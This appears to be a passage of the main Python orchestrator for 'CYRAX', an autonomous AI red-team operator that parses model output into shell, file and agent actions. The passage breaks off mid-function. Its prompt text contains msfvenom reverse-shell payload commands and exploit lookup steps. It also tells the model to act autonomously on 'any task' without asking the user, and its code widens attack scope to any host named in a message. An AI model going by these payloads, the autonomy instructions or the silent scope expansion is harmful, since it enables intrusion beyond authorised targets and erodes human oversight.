#!/usr/bin/env python3
"""
CYRAX - Autonomous AI Red Team Operator
Main orchestrator and entry point.

Usage:
    cyrax                       # Launch CYRAX (after pip install)
    cyrax --setup               # First-time interactive setup
    cyrax --config config.yaml  # Use a specific config file
    python cyrax.py             # Run directly without installing
"""

import sys
import os
import re
import argparse
import hashlib
import difflib
import threading
import string
import time
import importlib.resources
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# Check dependencies before anything else
_REQUIRED_PACKAGES = {
    "yaml": "pyyaml",
    "rich": "rich",
    "httpx": "httpx",
}

_missing = []
for _module, _pip_name in _REQUIRED_PACKAGES.items():
    try:
        __import__(_module)
    except ImportError:
        _missing.append(_pip_name)

if _missing:
    print(f"\n[!] Missing required packages: {', '.join(_missing)}")
    print(f"    Python executable: {sys.executable}")
    print(f"    Run: {sys.executable} -m pip install -r requirements.txt\n")
    sys.exit(1)

import yaml  # noqa: E402
from rich import box  # noqa: E402
from rich.table import Table  # noqa: E402

# Ensure project root is on path
sys.path.insert(0, str(Path(__file__).parent))

from models.model_manager import ModelManager  # noqa: E402
from tools.executor import ToolExecutor, split_compound_commands, sanitize_command  # noqa: E402
from tools.tool_registry import ToolRegistry  # noqa: E402
from tools.browser import (  # noqa: E402
    BrowserManager,
    parse_browser_command,
    is_browser_command,
    BROWSER_COMMANDS,
    validate_browser_command,
    browser_command_has_shell_operators,
)
from memory.conversation import ConversationMemory  # noqa: E402
from memory.knowledge_base import KnowledgeBase  # noqa: E402
from memory.campaign_state import CampaignState  # noqa: E402
from memory.mission_memory import MissionMemory  # noqa: E402
from agents.base_agent import BaseAgent  # noqa: E402
from agents.recon_agent import ReconAgent  # noqa: E402
from agents.exploit_agent import ExploitAgent  # noqa: E402
from agents.post_exploit_agent import PostExploitAgent  # noqa: E402
from agents.ad_agent import ActiveDirectoryAgent  # noqa: E402
from agents.web_agent import WebAgent  # noqa: E402
from agents.cloud_agent import CloudAgent  # noqa: E402
from agents.osint_agent import OSINTAgent  # noqa: E402
from utils import display  # noqa: E402
from utils.logging import init_logger  # noqa: E402
from utils.platform_info import get_platform_context, get_default_work_dir  # noqa: E402
from utils.safety import ScopeEnforcer, PermissionGate  # noqa: E402
from agents.agent_pool import SubprocessAgentPool  # noqa: E402


AGENT_CLASSES = {
    "recon": ReconAgent,
    "exploit": ExploitAgent,
    "post": PostExploitAgent,
    "ad": ActiveDirectoryAgent,
    "web": WebAgent,
    "cloud": CloudAgent,
    "osint": OSINTAgent,
}


_ORCHESTRATOR_PROMPT_PATH = Path(__file__).parent / "config" / "prompts" / "orchestrator.txt"
_ORCHESTRATOR_REQUIRED_PLACEHOLDERS = {
    "target",
    "scope",
    "mission_context",
    "available_tools",
}

_API_MODEL_PROVIDERS = {"anthropic", "openai", "google", "xai"}
_LOCAL_MODEL_PROVIDERS = {"ollama", "lmstudio", "vllm"}
_MODEL_PROVIDERS = sorted(_API_MODEL_PROVIDERS | _LOCAL_MODEL_PROVIDERS | {"custom"})
_PROVIDER_ENV_VARS = {
    "anthropic": "ANTHROPIC_API_KEY",
    "openai": "OPENAI_API_KEY",
    "google": "GOOGLE_API_KEY",
    "xai": "GROK_API_KEY",
    "custom": "CYRAX_API_KEY",
    "vllm": "VLLM_API_KEY",
}
_PROVIDER_DEFAULT_MODELS = {
    "anthropic": "claude-sonnet-4-20250514",
    "openai": "gpt-4o",
    "google": "gemini-1.5-pro",
    "xai": "grok-4.3",
    "ollama": "llama3.1:70b",
    "lmstudio": "local-model",
    "vllm": "local-model",
    "custom": "custom-model",
}
_API_KEY_PLACEHOLDERS = {
    "",
    "YOUR_API_KEY_HERE",
    "your-key-here",
    "sk-xxxxx",
    "xxxxx",
}


def _read_orchestrator_prompt_template() -> str:
    """Read orchestrator prompt template from source tree or installed package data."""
    # Dev/source-tree path (works when running from cloned repo)
    if _ORCHESTRATOR_PROMPT_PATH.exists():
        return _ORCHESTRATOR_PROMPT_PATH.read_text(encoding="utf-8")

    # Installed package fallback (works for wheel/site-packages installs)
    try:
        packaged = importlib.resources.files("config").joinpath(
            "prompts/orchestrator.txt"
        )
        return packaged.read_text(encoding="utf-8")
    except Exception as exc:
        raise RuntimeError(
            "Failed to locate orchestrator prompt template. Checked source path "
            f"{_ORCHESTRATOR_PROMPT_PATH} and package resource config/prompts/orchestrator.txt: {exc}"
        ) from exc


@contextmanager
def _working_directory(cwd: Optional[str]):
    """Temporarily run a CLI subcommand from another working directory."""
    if not cwd:
        yield
        return
    original = Path.cwd()
    target = Path(cwd).expanduser().resolve()
    os.chdir(target)
    try:
        yield
    finally:
        os.chdir(original)


def _is_missing_api_key(api_key: str) -> bool:
    """Return True when an API key is empty or still a documented placeholder."""
    return api_key.strip() in _API_KEY_PLACEHOLDERS


def _deep_merge_config(base: dict, override: dict) -> dict:
    """Merge user configuration over defaults while preserving nested defaults."""
    merged = dict(base)
    for key, value in override.items():
        if isinstance(value, dict):
            base_value = merged.get(key, {})
            if not isinstance(base_value, dict):
                base_value = {}
            merged[key] = _deep_merge_config(base_value, value)
        else:
            merged[key] = value
    return merged


def _default_config() -> dict:
    """Return the default CYRAX configuration."""
    return {
        "model": {
            "provider": "anthropic",
            "api_key": os.environ.get("ANTHROPIC_API_KEY", ""),
            "model_name": "claude-sonnet-4-20250514",
            "temperature": 0.7,
            "max_tokens": 4096,
        },
        "tools": {
            "timeout": 300,
            "allow_dangerous": False,
            "work_dir": get_default_work_dir(),
        },
        "memory": {
            "db_path": "data/cyrax.db",
            "max_history": 50,
        },
        "logging": {
            "log_dir": "logs",
            "level": "INFO",
        },
        "display": {
            "show_reasoning": True,
            "theme": "dark",
            "streaming": True,
        },
        "safety": {
            "auto_approve": False,
        },
        "campaign": {
            "data_dir": "data/campaigns",
            "status_interval": 5,
        },
    }


def _apply_env_model_defaults(config: dict) -> dict:
    """Fill missing model keys from provider defaults and environment variables."""
    model = config.setdefault("model", {})
    if (
        os.environ.get("GROK_API_KEY")
        and str(model.get("provider", "") or "") in ("", "anthropic")
        and _is_missing_api_key(str(model.get("api_key", "") or ""))
    ):
        model["provider"] = "xai"
    provider = model.get("provider") or "anthropic"
    model["provider"] = provider
    provider_default_model = _PROVIDER_DEFAULT_MODELS.get(provider, "")
    current_model = str(model.get("model_name", "") or "")
    if (
        not current_model
        or current_model in _PROVIDER_DEFAULT_MODELS.values()
        and current_model != provider_default_model
    ):
        model["model_name"] = provider_default_model
    model.setdefault("temperature", 0.7)
    model.setdefault("max_tokens", 4096)

    if provider == "xai" and os.environ.get("GROK_PRIMARY_MODEL"):
        model["model_name"] = os.environ["GROK_PRIMARY_MODEL"]

    env_var = _PROVIDER_ENV_VARS.get(provider, "")
    api_key = str(model.get("api_key", "") or "")
    if env_var and _is_missing_api_key(api_key):
        env_value = os.environ.get(env_var, "")
        if env_value:
            model["api_key"] = env_value
    if provider == "xai" and _is_missing_api_key(str(model.get("api_key", "") or "")):
        env_value = os.environ.get("XAI_API_KEY", "")
        if env_value:
            model["api_key"] = env_value

    if provider == "ollama":
        model.setdefault("api_url", "http://localhost:11434")
    elif provider == "lmstudio":
        model.setdefault("api_url", "http://localhost:1234/v1")
    elif provider == "xai":
        model["api_url"] = os.environ.get("GROK_BASE_URL", model.get("api_url") or "https://api.x.ai/v1")
    return config


def _redact_config(config: dict) -> dict:
    """Return a copy of config that is safe to print."""
    redacted = _deep_merge_config({}, config)
    model = redacted.get("model", {})
    api_key = str(model.get("api_key", "") or "")
    if api_key and not _is_missing_api_key(api_key):
        model["api_key"] = f"{api_key[:4]}...{api_key[-4:]}" if len(api_key) > 8 else "***"
    return redacted


def _find_all_actions(response: str) -> list[tuple[int, str, re.Match]]:
    """
    Find all action blocks in a response and return them sorted by position.
    This ensures actions are processed in document order (e.g., WRITE_FILE
    before EXECUTE when the AI writes a file then runs it).
    """
    actions = []

    for m in re.finditer(r'\[EXECUTE\]\s*(.*?)\s*\[/EXECUTE\]', response, re.DOTALL):
        actions.append((m.start(), 'execute', m))
    for m in re.finditer(r'\[WRITE_FILE\s+path="([^"]+)"\](.*?)\[/WRITE_FILE\]', response, re.DOTALL):
        actions.append((m.start(), 'write_file', m))
    for m in re.finditer(r'\[SPAWN\s+type="(\w+)"\](.*?)\[/SPAWN\]', response, re.DOTALL):
        actions.append((m.start(), 'spawn', m))
    for m in re.finditer(r'\[STORE\s+category="(\w+)"\s+key="([^"]+)"\](.*?)\[/STORE\]', response, re.DOTALL):
        actions.append((m.start(), 'store', m))
    for m in re.finditer(r'\[READ_FILE\s+path="([^"]+)"\s*\]', response):
        actions.append((m.start(), 'read_file', m))
    for m in re.finditer(r'\[KILL\s+agent="([^"]+)"(?:\s+reason="([^"]*)")?\]', response):
        actions.append((m.start(), 'kill', m))
    for m in re.finditer(r'\[FINDING\s+severity="(\w+)"\s+title="([^"]+)"\](.*?)\[/FINDING\]', response, re.DOTALL):
        actions.append((m.start(), 'finding', m))

    actions.sort(key=lambda x: x[0])
    return actions


def _find_tool_intent_actions(response: str) -> list[tuple[int, str, object]]:
    """
    Recover plain-language tool intents from model output.

    Some providers narrate "invoke tool bash with command is ..." instead of
    emitting CYRAX action tags. Treat that as a shell execute action so the
    operator acts instead of ending with zero actions.
    """
    actions = []
    pattern = re.compile(
        r"invoke\s+tool\s+(?:bash|shell|terminal|execute)\s+"
        r"(?:with\s+)?(?:command\s+)?(?:is\s+)?(?P<command>[^\n]+)",
        re.IGNORECASE,
    )
    for match in pattern.finditer(response):
        command = match.group("command").strip()
        if command:
            actions.append((match.start(), "execute_text", command))
    return actions


def _find_unclosed_tags(response: str) -> list[str]:
    """
    Detect action tags that were opened but never closed (malformed LLM output).

    Returns a list of human-readable descriptions of unclosed tags so the
    orchestrator can feed them back to the model as [Action Feedback].

    DEF-M07-1: Without this, the model receives no signal that its action
    syntax was broken — it thinks the command ran, but it silently did nothing.
    """
    unclosed = []
    # Paired tags that require a closing counterpart
    paired = [
        ("EXECUTE", r'\[EXECUTE\]', r'\[/EXECUTE\]'),
        ("WRITE_FILE", r'\[WRITE_FILE\b[^\]]*\]', r'\[/WRITE_FILE\]'),
        ("SPAWN", r'\[SPAWN\b[^\]]*\]', r'\[/SPAWN\]'),
        ("STORE", r'\[STORE\b[^\]]*\]', r'\[/STORE\]'),
        ("FINDING", r'\[FINDING\b[^\]]*\]', r'\[/FINDING\]'),
    ]
    for tag_name, opener_pat, closer_pat in paired:
        opens = len(re.findall(opener_pat, response))
        closes = len(re.findall(closer_pat, response))
        if opens > closes:
            unclosed.append(
                f"{tag_name} (opened {opens}x, closed {closes}x — "
                f"missing [/{tag_name}] closing tag)"
            )
    return unclosed


def _get_failure_guidance(command: str, error: str) -> str:
    """Return specific guidance based on what went wrong."""
    err_lower = error.lower()
    if "timeout" in err_lower:
        return (
            " Try browser.html() to see the actual page structure, "
            "or use browser.wait() before interacting."
        )
    if "not found" in err_lower or "no such file" in err_lower:
        return (
            " Use [WRITE_FILE] to create files you need, "
            "or check available tools."
        )
    if "permission denied" in err_lower:
        return " Try a different approach or check if elevated privileges are needed."
    if "connection refused" in err_lower:
        return " The service may not be running. Try scanning for open ports first."
    if "name or service not known" in err_lower or "could not resolve" in err_lower:
        return " DNS resolution failed. Check the hostname or try the IP directly."
    return " Analyze the error and try a different approach."


class CyraxOrchestrator:
    """
    Main AI orchestrator that manages the entire red team operation.
    This is the conversational AI that talks to the user.
    """

    def __init__(self, config: dict):
        self.config = config

        # Safety: Scope enforcement and permission gates
        self.scope = ScopeEnforcer()  # Configured when target is set

        # Initialize logging
        log_config = config.get("logging", {})
        self.logger = init_logger(
            log_dir=log_config.get("log_dir", "logs"),
            level=log_config.get("level", "INFO"),
        )

        # Initialize model
        self.model = ModelManager(config["model"])

        # Initialize tools
        tool_config = config.get("tools", {})
        default_work = get_default_work_dir()
        executor = ToolExecutor(
            work_dir=tool_config.get("work_dir", "") or default_work,
            timeout=tool_config.get("timeout", 300),
            allow_dangerous=tool_config.get("allow_dangerous", False),
            scope_enforcer=self.scope,
        )
        self.tools = ToolRegistry(executor=executor)

        # Initialize browser (lazy - starts on first use)
        self.browser = BrowserManager(
            work_dir=tool_config.get("work_dir", "") or default_work
        )

        # Mission memory: persistent tiered context system
        self.mission = MissionMemory()

        # Initialize memory (linked to mission memory for fact persistence)
        mem_config = config.get("memory", {})
        self.conversation = ConversationMemory(
            max_history=mem_config.get("max_history", 50),
            mission_memory=self.mission,
        )
        self.knowledge = KnowledgeBase(
            db_path=mem_config.get("db_path", "data/cyrax.db")
        )
        self.campaign = CampaignState()

        self.permission_gate = PermissionGate(
            auto_approve=config.get("safety", {}).get("auto_approve", False)
        )

        # Agent management
        self.agents: dict[str, BaseAgent] = {}
        self.agent_counter: dict[str, int] = {}
        self.agent_reports: list[dict] = []
        # Session ID for IPC socket paths
        self._session_id = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        # Agent pool: subprocess-based with IPC, tmux, and kill capability
        self.agent_pool = SubprocessAgentPool(
            session_id=self._session_id,
            max_concurrent=config.get("agents", {}).get("max_concurrent", 10),
            on_finding=self._on_agent_finding,
            on_report=self._on_agent_report,
            on_permission_request=self._on_agent_permission_request,
            on_agent_complete=self._on_agent_complete,
            on_agent_status=self._on_agent_status,
        )

        # Pending permission requests from agent subprocesses
        self._pending_permission_requests: dict[str, dict] = {}

        # Display config
        display_config = config.get("display", {})
        self.show_reasoning = display_config.get("show_reasoning", True)
        display.configure_streaming(enabled=display_config.get("streaming", True))

        self._consecutive_cmd_failures = 0
        self._failed_cmd_signatures: list[str] = []
        self._failed_pattern_counts: dict[str, int] = {}
        self._recent_error_types: list[str] = []

        # Per-turn action tracking
        self._actions_executed_this_turn: int = 0
        self._turn_action_counts: list[int] = []
        self._consecutive_empty_turns: int = 0
        self._last_response_hash: str = ""
        self._recent_cmds_this_turn: list[str] = []
        self._cmds_succeeded_this_turn: int = 0

        # Dedup: temperature escalation on repeated responses
        self._dedup_temp_boost: float = 0.0
        self._last_response_was_refusal: bool = False

        # Campaign mode
        self._campaign_mode = False
        self._campaign_name = ""
        self._campaign_dir: Optional[Path] = None

        # User message queue (for messages typed during AI execution)
        self._queued_user_message: Optional[str] = None

        # Pause flag
        self._pause_requested = False
        self._hard_interrupt_requested = False

        # Plan mode (Claude Code-style: think before acting)
        self._plan_mode = False

        # Load and validate prompt templates at startup
        self._orchestrator_prompt_template = self._load_orchestrator_prompt_template()

    def _load_orchestrator_prompt_template(self) -> str:
        """Load and validate the orchestrator operational prompt template."""
        try:
            template = _read_orchestrator_prompt_template()
        except OSError as exc:
            raise RuntimeError(
                f"Failed to read orchestrator prompt template at {_ORCHESTRATOR_PROMPT_PATH}: {exc}"
            ) from exc

        formatter = string.Formatter()
        placeholders = {
            field_name
            for _, field_name, _, _ in formatter.parse(template)
            if field_name
        }
        missing = sorted(_ORCHESTRATOR_REQUIRED_PLACEHOLDERS - placeholders)
        if missing:
            raise ValueError(
                "Invalid orchestrator prompt template "
                f"({_ORCHESTRATOR_PROMPT_PATH}): missing required placeholders: "
                f"{', '.join(missing)}"
            )

        return template

    def start_campaign(self, name: str, objective: str = ""):
        """Start or resume a named campaign with persistent state."""
        self._campaign_name = name
        self._campaign_dir = Path(f"data/campaigns/{name}")
        self._campaign_dir.mkdir(parents=True, exist_ok=True)

        # Try to resume existing campaign
        existing = CampaignState.load_from_dir(self._campaign_dir)
        if existing:
            self.campaign = existing
            self.campaign.name = name
            if self.campaign.status == "paused":
                self.campaign.status = "active"

            self.knowledge.close()
            self.knowledge = KnowledgeBase(
                db_path=str(self._campaign_dir / "cyrax.db")
            )

            conv_file = self._campaign_dir / "conversation.json"
            if conv_file.exists():
                self.conversation = ConversationMemory.from_json(
                    conv_file.read_text()
                )

            # Restore mission memory
            saved_mission = MissionMemory.load_from_dir(self._campaign_dir)
            if saved_mission:
                self.mission = saved_mission

            display.show_info(
                f"Resumed campaign '{name}' (status: {existing.status}, "
                f"hosts: {len(self.campaign.compromised_hosts)}, "
                f"attack steps: {len(self.campaign.attack_path)})"
            )
        else:
            self.campaign.name = name
            if objective:
                self.campaign.objective = objective

            self.knowledge.close()
            self.knowledge = KnowledgeBase(
                db_path=str(self._campaign_dir / "cyrax.db")
            )
            display.show_info(f"Started new campaign '{name}'")

        self._campaign_mode = True

        # Configure scope enforcement from the campaign target
        if self.campaign.target:
            self._configure_scope(self.campaign.target)

        # Attempt to reconnect orphaned agents from previous session
        self._reconnect_orphaned_agents()

    def _configure_scope(self, target_str: str):
        """Parse the target string and configure scope enforcement."""
        # Split on common delimiters to support multiple targets
        targets = re.split(r'[,;\s]+', target_str)
        targets = [t.strip() for t in targets if t.strip()]
        if targets:
            self.scope.reset(targets)
            self.tools.executor.scope_enforcer = self.scope
            self.logger.info(f"Scope configured: {targets}")

            # Update mission memory with core context
            from utils.platform_info import get_platform_context
            platform = get_platform_context()
            self.mission.set_core(
                target=target_str,
                scope=self.scope.get_scope_description(),
                objective=self.campaign.objective,
                operator_platform=platform,
            )

    def _save_campaign_state(self):
        """Save all campaign state to disk."""
        if not self._campaign_mode or self._campaign_dir is None:
            return
        self.campaign.save_to_dir(self._campaign_dir)
        self.mission.save_to_dir(self._campaign_dir)
        conv_file = self._campaign_dir / "conversation.json"
        conv_file.write_text(self.conversation.to_json())

    def _mark_agents_orphaned_if_active(self):
        """Mark active agents as orphaned before persisting/exit."""
        if self.agent_pool.get_running():
            self.campaign.mark_agents_orphaned()

    def _get_metasploit_guidance(self) -> str:
        """Return Metasploit usage guidance if MSF tools are available."""
        msf_tools = ["msfconsole", "msfvenom", "searchsploit"]
        available = {
            name
            for name in msf_tools
            if name in self.tools.tools and self.tools.tools[name].available
        }

        if not available:
            return ""

        sections = ["METASPLOIT FRAMEWORK GUIDANCE:"]

        if "searchsploit" in available:
            sections.append(
                "SEARCHSPLOIT (Exploit-DB Lookup):\n"
                "- Search: [EXECUTE] searchsploit apache 2.4.49 [/EXECUTE]\n"
                "- Copy exploit: [EXECUTE] searchsploit -m 50383 [/EXECUTE]\n"
                "- Always search BEFORE manual exploitation."
            )

        if "msfconsole" in available:
            sections.append(
                "MSFCONSOLE (Non-Interactive — ALWAYS use -q -x, end with 'exit'):\n"
                '- Search: [EXECUTE] msfconsole -q -x "search type:exploit apache; exit" [/EXECUTE]\n'
                '- Check: [EXECUTE] msfconsole -q -x "use exploit/path; set RHOSTS target; check; exit" [/EXECUTE]\n'
                "- NEVER launch msfconsole interactively — it will hang."
            )

        if "msfvenom" in available:
            sections.append(
                "MSFVENOM (Payload Generation):\n"
                "- Linux: [EXECUTE] msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf [/EXECUTE]\n"
                "- Windows: [EXECUTE] msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe [/EXECUTE]"
            )

        return "\n\n".join(sections)

    def _get_workspace_context(self) -> str:
        """Build workspace awareness context: cwd, files, browser state."""
        parts = []
        work_dir = self.tools.executor.work_dir
        parts.append(f"Working directory: {work_dir}")
        try:
            files = sorted(Path(work_dir).iterdir())
            scripts = [f.name for f in files if f.is_file() and f.suffix in ('.py', '.sh', '.txt', '.php', '.html')]
            if scripts:
                parts.append(f"Scripts in workdir: {', '.join(scripts[:20])}")
        except Exception:
            pass
        if self.browser and self.browser._page:
            try:
                parts.append(f"Browser current URL: {self.browser._page.url}")
                cookies = self.browser._page.context.cookies()
                if cookies:
                    cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies[:10])
                    parts.append(f"Browser cookies: {cookie_str}")
                    parts.append(
                        "NOTE: When writing Python scripts (httpx/curl), pass these "
                        "cookies for authenticated requests."
                    )
            except Exception:
                pass
        return "\n".join(parts)

    def _session_scope_label(self) -> str:
        """Return a human-readable scope label for session status."""
        if self.scope.enabled:
            return self.scope.get_scope_description()
        if self.campaign.target:
            return str(self.campaign.target)
        return "not set"

    def _current_mode_label(self) -> str:
        """Return the current operator permission mode label."""
        if self._plan_mode:
            return "plan"
        if self.permission_gate.auto_approve:
            return "auto"
        return self.permission_gate.policy_mode

    def _slash_commands(self) -> list[tuple[str, str, str]]:
        """Return supported interactive commands for help rendering."""
        return [
            ("/status", "", "Show campaign, model, permissions, and scope"),
            ("/config", "", "Show active provider/model/workdir without secrets"),
            ("/model", "[name]", "Show or switch the current model name"),
            ("/scope", "[target]", "Switch target scope (resets previous scope)"),
            ("/add-dir", "<path>", "Add a directory to the workspace scope"),
            ("/mode", "[auto|interactive|plan]", "Show or switch permission mode"),
            ("/plan", "", "Enter plan mode — think before acting"),
            ("/approve", "<category>", "Pre-approve an action category"),
            ("/auto", "", "Enable fully autonomous mode"),
            ("/compact", "[keep]", "Summarize older conversation context"),
            ("/clear", "", "Clear conversation context"),
            ("/agents", "", "List background agents"),
            ("/kill", "<id>", "Kill one agent"),
            ("/killall", "", "Kill all agents"),
            ("/dashboard", "", "Show tmux dashboard info"),
            ("/findings", "", "Show security findings"),
            ("/creds", "", "Show discovered credentials"),
            ("/hosts", "", "Show discovered hosts"),
            ("/usage", "", "Show model token usage"),
            ("/export", "", "Export findings report"),
            ("/pause", "", "Pause campaign and save state"),
            ("/help", "", "Show this command menu"),
            ("/exit", "", "Exit CYRAX"),
        ]

    def _build_system_prompt(self) -> str:
        """Build the system prompt — lean, front-loaded, with dynamic target substitution."""
        available_tools = self.tools.get_available_tools_summary()
        knowledge_summary = self.knowledge.get_summary()
        campaign_summary = self.campaign.summary()
        platform_context = get_platform_context()
        metasploit_guidance = self._get_metasploit_guidance()
        workspace_context = self._get_workspace_context()

        # Update mission memory with live browser state
        self.mission.extract_from_browser(self.browser)

        target = self.campaign.target
        scope_desc = self.scope.get_scope_description()

        # Build persistent mission memory block
        mission_context = self.mission.build_context_block()

        if self._plan_mode:
            return f"""You are CYRAX in plan mode.

Create a concise execution plan for the user's request. Do NOT execute commands or emit action blocks.

Your plan should be specific, operational, and ready to execute once the user switches mode with /mode auto or /mode interactive.

TARGET: {target or "not set"}
SCOPE: {scope_desc}
WORKSPACE: {workspace_context}
ENGAGEMENT STATE: {campaign_summary}

{platform_context}

{mission_context}
"""

        # === STANDBY MODE: no target yet — conversational but capable ===
        if not target:
            return f"""You are CYRAX, an autonomous AI operator with full shell access and broad capabilities.

No target has been set yet, but you can still execute commands, read/write files, and help with any task.

When the user provides a target (URL, IP, domain, or local file path), you will begin focused operations. Meanwhile, answer questions and execute commands as needed.

CAPABILITIES:
- Shell commands, scripts, programming in any language
- File reading, writing, editing, code analysis
- Security scanning, penetration testing, vulnerability research
- Browser automation and web interaction
- Package installation, environment setup, builds

ACTION FORMAT:
[EXECUTE] <shell_command> [/EXECUTE]
[WRITE_FILE path="script.py"] <code> [/WRITE_FILE]
[READ_FILE path="filepath"] [/READ_FILE]

RULES:
- When the user asks you to do something, do it. Output action blocks.
- Talk like a skilled engineer, not a chatbot. Short, direct, no filler.
- NEVER use markdown headers, bold, bullets, or numbered lists.
- NEVER end with "Let me know" or filler. NEVER ask the user to do things manually.
- You are autonomous. Make decisions and act.

{platform_context}

{metasploit_guidance}
"""

        # Build active agents context
        active_agents_block = ""
        pool_status = self.agent_pool.get_status()
        running_agents = {
            aid: info for aid, info in pool_status.items()
            if info["status"] in ("starting", "active")
        }
        if running_agents:
            agent_lines = []
            for aid, info in running_agents.items():
                agent_lines.append(
                    f"  {aid}: {info['status']} (iter {info['iteration']}) - {info['task']}"
                )
            active_agents_block = (
                "ACTIVE AGENTS (running in background):\n"
                + "\n".join(agent_lines) + "\n"
                "These agents will report findings automatically. "
                "Use [KILL agent=\"ID\"] to stop one.\n"
            )

        # === OPERATIONAL MODE: target is set — execute actions ===
        return self._orchestrator_prompt_template.format(
            target=target,
            scope=scope_desc,
            active_agents=active_agents_block,
            mission_context=mission_context,
            platform_context=platform_context,
            workspace_context=workspace_context,
            campaign_state=campaign_summary,
            knowledge_summary=knowledge_summary,
            available_tools=available_tools,
            metasploit_guidance=metasploit_guidance,
        )

    def chat(self, user_message: str) -> str:
        """
        Main conversation loop. Process user message and return response.
        Uses streaming for real-time output display.
        """
        self.logger.log_conversation("user", user_message)
        self.conversation.add_message("user", user_message)

        # Reset per-turn tracking
        self._actions_executed_this_turn = 0
        self._recent_cmds_this_turn = []
        self._cmds_succeeded_this_turn = 0
        # DEF-M07-2: Reset cross-turn failure pattern counts so a command that
        # failed against target A isn't blocked when retried against target B.
        self._failed_pattern_counts = {}

        # Extract or update target whenever the user names a URL, IP, domain, or
        # local path. This mirrors Claude Code's workspace model: explicit user
        # direction can switch focus mid-session instead of trapping CYRAX in
        # stale scope.
        self._try_extract_target(user_message)

        system_prompt = self._build_system_prompt()

        try:
            response = self._stream_response(system_prompt)
        except Exception as e:
            error_msg = f"Model error: {e}"
            self.logger.log_error("CYRAX", error_msg)
            display.show_error(error_msg)
            return error_msg

        self.conversation.add_message("assistant", response)
        self.logger.log_conversation("assistant", response)

        # Process the response for actions
        response = self._process_response(response)

        return response

    def _try_extract_target(self, message: str):
        """Extract target from user message and update scope dynamically.

        Unlike the original implementation, this always runs -- even when scope
        is already enabled -- so the user can switch targets mid-session by
        mentioning a new URL, path, IP, or domain.  Explicit switch verbs
        ('switch to', 'look at', 'scan', 'focus on', 'target', 'check')
        trigger a full scope reset; otherwise new targets are additive.
        """
        _SWITCH_VERBS = re.compile(
            r'\b(?:switch\s+to|look\s+at|scan|focus\s+on|target|check|analyze|audit|examine|inspect)\b',
            re.IGNORECASE,
        )
        is_explicit_switch = bool(_SWITCH_VERBS.search(message))

        new_target = None

        # Full URLs first (most specific)
        url_match = re.search(r'(https?://[^\s,]+)', message)
        if url_match:
            from urllib.parse import urlparse
            full_url = url_match.group(1).rstrip(".,;")
            parsed = urlparse(full_url)
            if parsed.hostname:
                new_target = full_url

        # Local paths (before domains so /Users/name/repo beats a domain in the same msg)
        if not new_target:
            local_path_match = re.search(r'(?<!\S)((?:~|/|[A-Za-z]:[\\/])[^\s,;\'\"`<>]+)', message)
            if local_path_match:
                new_target = local_path_match.group(1).rstrip(".,;")

        # IPs
        if not new_target:
            ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?)\b', message)
            if ip_match:
                new_target = ip_match.group(1)

        # Domain-like strings
        if not new_target:
            domain_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})\b', message)
            if domain_match:
                domain = domain_match.group(1).lower()
                _FALSE_POSITIVES = {'example.com', 'target.com', 'google.com', 'github.com'}
                if domain not in _FALSE_POSITIVES:
                    new_target = domain

        if not new_target:
            return

        # If target is the same as current, no change needed
        if new_target == getattr(self.campaign, "target", None):
            return

        # Determine scope update strategy
        if is_explicit_switch or not self.scope.enabled:
            self._configure_scope(new_target)
            self.campaign.target = new_target
            display.show_info(f"Target updated: {new_target}")
        else:
            # Additive: extend scope to include new target
            self.scope.add_targets([new_target])
            self.tools.executor.scope_enforcer = self.scope
            if not self.campaign.target:
                self.campaign.target = new_target

    def _stream_response(self, system_prompt: str) -> str:
        """Stream a model response with real-time display."""
        full_content = []
        stream = display.SmoothStream()
        stream_buf = display.StreamBuffer()
        first_token = True

        # Apply temperature boost for dedup recovery
        temp_override = None
        if self._dedup_temp_boost > 0:
            base_temp = self.model.temperature
            temp_override = min(base_temp + self._dedup_temp_boost, 1.2)

        spinner = display.get_spinner("Thinking...")
        spinner.start()

        try:
            for chunk in self.model.generate_stream(
                system=system_prompt,
                messages=self.conversation.get_messages(),
                temperature=temp_override,
            ):
                if self._pause_requested or self._hard_interrupt_requested:
                    break
                if chunk.get("done"):
                    break
                delta = chunk.get("delta", "")
                if delta:
                    full_content.append(delta)
                    if first_token:
                        spinner.stop()
                        stream.start("CYRAX")
                        first_token = False
                    visible = stream_buf.feed(delta)
                    if visible:
                        stream.feed(visible)
        finally:
            if first_token:
                spinner.stop()
            remaining = stream_buf.flush()
            if remaining:
                stream.feed(remaining)
            if not first_token:
                stream.finish()

        # Reset temp boost after successful generation
        self._dedup_temp_boost = 0.0

        return "".join(full_content)

    def _process_response(self, response: str) -> str:
        """
        Process CYRAX's response for embedded actions iteratively.
        Each loop: extract actions, execute, get follow-up, repeat.
        """
        # In plan mode, skip action extraction and execution entirely
        if getattr(self, "_plan_mode", False):
            return response

        accumulated = response
        current_response = response
        seen_hashes_this_turn: set[str] = set()
        echo_regens = 0

        depth = 0
        while True:
            # Check for pause request
            if self._pause_requested or self._hard_interrupt_requested:
                self._pause_requested = False
                break

            current_response, accumulated, regenerated = self._maybe_regenerate_echo_response(
                response=current_response,
                accumulated=accumulated,
                depth=depth,
                echo_regens=echo_regens,
            )
            if regenerated:
                echo_regens += 1

            # Deduplication: detect if the LLM is repeating itself
            full_hash = hashlib.md5(current_response.encode()).hexdigest()
            short_hash = hashlib.md5(current_response[:500].encode()).hexdigest()
            is_dup = (
                full_hash in seen_hashes_this_turn
                or short_hash == self._last_response_hash
            )
            seen_hashes_this_turn.add(full_hash)

            if is_dup:
                self.logger.info(f"Duplicate response detected at depth {depth}")
                # Don't inject fake user messages — just bump temperature and retry once
                self._dedup_temp_boost = min(self._dedup_temp_boost + 0.15, 0.5)
                if depth == 0:
                    # Give it one more shot with higher temperature
                    try:
                        followup = self._stream_response(self._build_system_prompt())
                        self.conversation.add_message("assistant", followup)
                        accumulated = f"{accumulated}\n\n{followup}"
                    except Exception:
                        pass
                break

            self._last_response_hash = short_hash

            action_results = self._execute_actions(current_response)

            # Auto-extract mission-relevant facts from the response
            self.mission.extract_from_response(current_response)
            self.mission.extract_from_browser(self.browser)

            # Circuit breaker: contextual error guidance instead of generic warning
